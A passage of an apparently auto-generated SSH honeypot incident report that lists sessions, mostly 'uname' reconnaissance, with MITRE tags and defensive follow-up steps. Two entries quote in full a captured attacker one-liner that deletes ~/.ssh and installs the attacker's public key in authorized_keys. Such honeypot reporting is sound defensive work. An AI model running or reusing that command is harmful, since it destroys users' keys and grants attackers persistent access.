
| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:17:19` | `cowrie.session.connect` |
| `2026-06-03 12:17:19` | `cowrie.client.version` |
| `2026-06-03 12:17:20` | `cowrie.client.kex` |
| `2026-06-03 12:17:20` | `cowrie.login.success` |
| `2026-06-03 12:17:21` | `cowrie.session.params` |
| `2026-06-03 12:17:21` | `cowrie.command.input` |
| `2026-06-03 12:17:21` | `cowrie.log.closed` |
| `2026-06-03 12:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7fb0eb7b4df

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:17 |
| **Last Seen** | 2026-06-03 12:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:17:25` | `cowrie.session.connect` |
| `2026-06-03 12:17:25` | `cowrie.client.version` |
| `2026-06-03 12:17:25` | `cowrie.client.kex` |
| `2026-06-03 12:17:26` | `cowrie.login.success` |
| `2026-06-03 12:17:27` | `cowrie.session.params` |
| `2026-06-03 12:17:27` | `cowrie.command.input` |
| `2026-06-03 12:17:27` | `cowrie.log.closed` |
| `2026-06-03 12:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b1b9b90889

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:00` | `cowrie.session.connect` |
| `2026-06-03 12:18:00` | `cowrie.client.version` |
| `2026-06-03 12:18:00` | `cowrie.client.kex` |
| `2026-06-03 12:18:02` | `cowrie.login.success` |
| `2026-06-03 12:18:02` | `cowrie.session.params` |
| `2026-06-03 12:18:02` | `cowrie.command.input` |
| `2026-06-03 12:18:02` | `cowrie.log.closed` |
| `2026-06-03 12:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f5eff977e3

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:06` | `cowrie.session.connect` |
| `2026-06-03 12:18:06` | `cowrie.client.version` |
| `2026-06-03 12:18:06` | `cowrie.client.kex` |
| `2026-06-03 12:18:07` | `cowrie.login.success` |
| `2026-06-03 12:18:08` | `cowrie.session.params` |
| `2026-06-03 12:18:08` | `cowrie.command.input` |
| `2026-06-03 12:18:08` | `cowrie.log.closed` |
| `2026-06-03 12:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0640e5e3b1d7

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:13` | `cowrie.session.connect` |
| `2026-06-03 12:18:13` | `cowrie.client.version` |
| `2026-06-03 12:18:13` | `cowrie.client.kex` |
| `2026-06-03 12:18:14` | `cowrie.login.success` |
| `2026-06-03 12:18:15` | `cowrie.session.params` |
| `2026-06-03 12:18:15` | `cowrie.command.input` |
| `2026-06-03 12:18:15` | `cowrie.log.closed` |
| `2026-06-03 12:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9137fbcb97d8

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:19` | `cowrie.session.connect` |
| `2026-06-03 12:18:19` | `cowrie.client.version` |
| `2026-06-03 12:18:19` | `cowrie.client.kex` |
| `2026-06-03 12:18:20` | `cowrie.login.success` |
| `2026-06-03 12:18:20` | `cowrie.session.params` |
| `2026-06-03 12:18:20` | `cowrie.command.input` |
| `2026-06-03 12:18:20` | `cowrie.log.closed` |
| `2026-06-03 12:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5c7940791e

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:25` | `cowrie.session.connect` |
| `2026-06-03 12:18:25` | `cowrie.client.version` |
| `2026-06-03 12:18:25` | `cowrie.client.kex` |
| `2026-06-03 12:18:26` | `cowrie.login.success` |
| `2026-06-03 12:18:27` | `cowrie.session.params` |
| `2026-06-03 12:18:27` | `cowrie.command.input` |
| `2026-06-03 12:18:27` | `cowrie.log.closed` |
| `2026-06-03 12:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0f75e2f56e

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:36` | `cowrie.session.connect` |
| `2026-06-03 12:18:36` | `cowrie.client.version` |
| `2026-06-03 12:18:36` | `cowrie.client.kex` |
| `2026-06-03 12:18:37` | `cowrie.login.success` |
| `2026-06-03 12:18:38` | `cowrie.session.params` |
| `2026-06-03 12:18:38` | `cowrie.command.input` |
| `2026-06-03 12:18:38` | `cowrie.log.closed` |
| `2026-06-03 12:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbafc8e64914

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:18 |
| **Last Seen** | 2026-06-03 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:18:42` | `cowrie.session.connect` |
| `2026-06-03 12:18:42` | `cowrie.client.version` |
| `2026-06-03 12:18:42` | `cowrie.client.kex` |
| `2026-06-03 12:18:43` | `cowrie.login.success` |
| `2026-06-03 12:18:44` | `cowrie.session.params` |
| `2026-06-03 12:18:44` | `cowrie.command.input` |
| `2026-06-03 12:18:44` | `cowrie.log.closed` |
| `2026-06-03 12:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5720e4ec29

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:19 |
| **Last Seen** | 2026-06-03 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:19:06` | `cowrie.session.connect` |
| `2026-06-03 12:19:06` | `cowrie.client.version` |
| `2026-06-03 12:19:06` | `cowrie.client.kex` |
| `2026-06-03 12:19:07` | `cowrie.login.success` |
| `2026-06-03 12:19:07` | `cowrie.session.params` |
| `2026-06-03 12:19:07` | `cowrie.command.input` |
| `2026-06-03 12:19:08` | `cowrie.log.closed` |
| `2026-06-03 12:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabaa3f4410b

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:19 |
| **Last Seen** | 2026-06-03 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:19:17` | `cowrie.session.connect` |
| `2026-06-03 12:19:17` | `cowrie.client.version` |
| `2026-06-03 12:19:17` | `cowrie.client.kex` |
| `2026-06-03 12:19:19` | `cowrie.login.success` |
| `2026-06-03 12:19:19` | `cowrie.session.params` |
| `2026-06-03 12:19:19` | `cowrie.command.input` |
| `2026-06-03 12:19:19` | `cowrie.log.closed` |
| `2026-06-03 12:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a2e266732e8

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:19 |
| **Last Seen** | 2026-06-03 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:19:23` | `cowrie.session.connect` |
| `2026-06-03 12:19:23` | `cowrie.client.version` |
| `2026-06-03 12:19:23` | `cowrie.client.kex` |
| `2026-06-03 12:19:24` | `cowrie.login.success` |
| `2026-06-03 12:19:25` | `cowrie.session.params` |
| `2026-06-03 12:19:25` | `cowrie.command.input` |
| `2026-06-03 12:19:25` | `cowrie.log.closed` |
| `2026-06-03 12:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c165bc523f

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:19 |
| **Last Seen** | 2026-06-03 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:19:40` | `cowrie.session.connect` |
| `2026-06-03 12:19:40` | `cowrie.client.version` |
| `2026-06-03 12:19:41` | `cowrie.client.kex` |
| `2026-06-03 12:19:42` | `cowrie.login.success` |
| `2026-06-03 12:19:42` | `cowrie.session.params` |
| `2026-06-03 12:19:42` | `cowrie.command.input` |
| `2026-06-03 12:19:42` | `cowrie.log.closed` |
| `2026-06-03 12:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f981cc42fc8f

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:19 |
| **Last Seen** | 2026-06-03 12:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:19:58` | `cowrie.session.connect` |
| `2026-06-03 12:19:58` | `cowrie.client.version` |
| `2026-06-03 12:19:58` | `cowrie.client.kex` |
| `2026-06-03 12:19:59` | `cowrie.login.success` |
| `2026-06-03 12:20:00` | `cowrie.session.params` |
| `2026-06-03 12:20:00` | `cowrie.command.input` |
| `2026-06-03 12:20:00` | `cowrie.log.closed` |
| `2026-06-03 12:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e122a5bd47

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:20 |
| **Last Seen** | 2026-06-03 12:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:20:04` | `cowrie.session.connect` |
| `2026-06-03 12:20:04` | `cowrie.client.version` |
| `2026-06-03 12:20:04` | `cowrie.client.kex` |
| `2026-06-03 12:20:05` | `cowrie.login.success` |
| `2026-06-03 12:20:06` | `cowrie.session.params` |
| `2026-06-03 12:20:06` | `cowrie.command.input` |
| `2026-06-03 12:20:06` | `cowrie.log.closed` |
| `2026-06-03 12:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b9f664f6ed

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:20 |
| **Last Seen** | 2026-06-03 12:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:20:09` | `cowrie.session.connect` |
| `2026-06-03 12:20:09` | `cowrie.client.version` |
| `2026-06-03 12:20:10` | `cowrie.client.kex` |
| `2026-06-03 12:20:11` | `cowrie.login.success` |
| `2026-06-03 12:20:11` | `cowrie.session.params` |
| `2026-06-03 12:20:11` | `cowrie.command.input` |
| `2026-06-03 12:20:11` | `cowrie.log.closed` |
| `2026-06-03 12:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e6ae245d6c

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:20 |
| **Last Seen** | 2026-06-03 12:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:20:27` | `cowrie.session.connect` |
| `2026-06-03 12:20:27` | `cowrie.client.version` |
| `2026-06-03 12:20:27` | `cowrie.client.kex` |
| `2026-06-03 12:20:28` | `cowrie.login.success` |
| `2026-06-03 12:20:29` | `cowrie.session.params` |
| `2026-06-03 12:20:29` | `cowrie.command.input` |
| `2026-06-03 12:20:29` | `cowrie.log.closed` |
| `2026-06-03 12:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60a8dd15866

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:20 |
| **Last Seen** | 2026-06-03 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:20:39` | `cowrie.session.connect` |
| `2026-06-03 12:20:39` | `cowrie.client.version` |
| `2026-06-03 12:20:39` | `cowrie.client.kex` |
| `2026-06-03 12:20:40` | `cowrie.login.success` |
| `2026-06-03 12:20:40` | `cowrie.session.params` |
| `2026-06-03 12:20:40` | `cowrie.command.input` |
| `2026-06-03 12:20:40` | `cowrie.log.closed` |
| `2026-06-03 12:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5b998f0c20

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:20 |
| **Last Seen** | 2026-06-03 12:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:20:56` | `cowrie.session.connect` |
| `2026-06-03 12:20:56` | `cowrie.client.version` |
| `2026-06-03 12:20:56` | `cowrie.client.kex` |
| `2026-06-03 12:20:58` | `cowrie.login.success` |
| `2026-06-03 12:20:58` | `cowrie.session.params` |
| `2026-06-03 12:20:58` | `cowrie.command.input` |
| `2026-06-03 12:20:58` | `cowrie.log.closed` |
| `2026-06-03 12:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b585589d9a

| Field | Detail |
|---|---|
| **Source IP** | `45.61.130[.]31` |
| **First Seen** | 2026-06-03 12:52 |
| **Last Seen** | 2026-06-03 12:52 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:52:05` | `cowrie.session.connect` |
| `2026-06-03 12:52:05` | `cowrie.client.version` |
| `2026-06-03 12:52:05` | `cowrie.client.kex` |
| `2026-06-03 12:52:06` | `cowrie.login.success` |
| `2026-06-03 12:52:07` | `cowrie.session.params` |
| `2026-06-03 12:52:07` | `cowrie.command.input` |
| `2026-06-03 12:52:07` | `cowrie.command.failed` |
| `2026-06-03 12:52:07` | `cowrie.log.closed` |
| `2026-06-03 12:52:08` | `cowrie.session.params` |
| `2026-06-03 12:52:08` | `cowrie.command.input` |
| `2026-06-03 12:52:08` | `cowrie.session.file_download` |
| `2026-06-03 12:52:08` | `cowrie.log.closed` |
| `2026-06-03 12:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.61.130[.]31` to AbuseIPDB if not already reported
- [ ] Block `45.61.130[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f7c2a50a2b

| Field | Detail |
|---|---|
| **Source IP** | `45.61.130[.]31` |
| **First Seen** | 2026-06-03 12:52 |
| **Last Seen** | 2026-06-03 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:52:23` | `cowrie.session.connect` |
| `2026-06-03 12:52:23` | `cowrie.client.version` |
| `2026-06-03 12:52:23` | `cowrie.client.kex` |
| `2026-06-03 12:52:24` | `cowrie.login.success` |
| `2026-06-03 12:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.61.130[.]31` to AbuseIPDB if not already reported
- [ ] Block `45.61.130[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b8efd5bb3b

| Field | Detail |
|---|---|
| **Source IP** | `119.96.158[.]238` |
| **First Seen** | 2026-06-03 12:53 |
| **Last Seen** | 2026-06-03 12:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:53:20` | `cowrie.session.connect` |
| `2026-06-03 12:53:20` | `cowrie.client.version` |
| `2026-06-03 12:53:21` | `cowrie.client.kex` |
| `2026-06-03 12:53:22` | `cowrie.login.success` |
| `2026-06-03 12:53:24` | `cowrie.session.params` |
| `2026-06-03 12:53:24` | `cowrie.command.input` |
| `2026-06-03 12:53:24` | `cowrie.command.failed` |
| `2026-06-03 12:53:24` | `cowrie.log.closed` |
| `2026-06-03 12:53:25` | `cowrie.session.params` |
| `2026-06-03 12:53:25` | `cowrie.command.input` |
| `2026-06-03 12:53:25` | `cowrie.session.file_download` |
| `2026-06-03 12:53:25` | `cowrie.log.closed` |
| `2026-06-03 12:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.158[.]238` to AbuseIPDB if not already reported
- [ ] Block `119.96.158[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a7c27c1015

| Field | Detail |
|---|---|
| **Source IP** | `119.96.158[.]238` |
| **First Seen** | 2026-06-03 12:53 |
| **Last Seen** | 2026-06-03 12:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:53:27` | `cowrie.session.connect` |
| `2026-06-03 12:53:27` | `cowrie.client.version` |
| `2026-06-03 12:53:27` | `cowrie.client.kex` |
| `2026-06-03 12:53:29` | `cowrie.login.success` |
| `2026-06-03 12:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.158[.]238` to AbuseIPDB if not already reported
- [ ] Block `119.96.158[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c31f1de073

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-06-03 13:59 |
| **Last Seen** | 2026-06-03 13:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
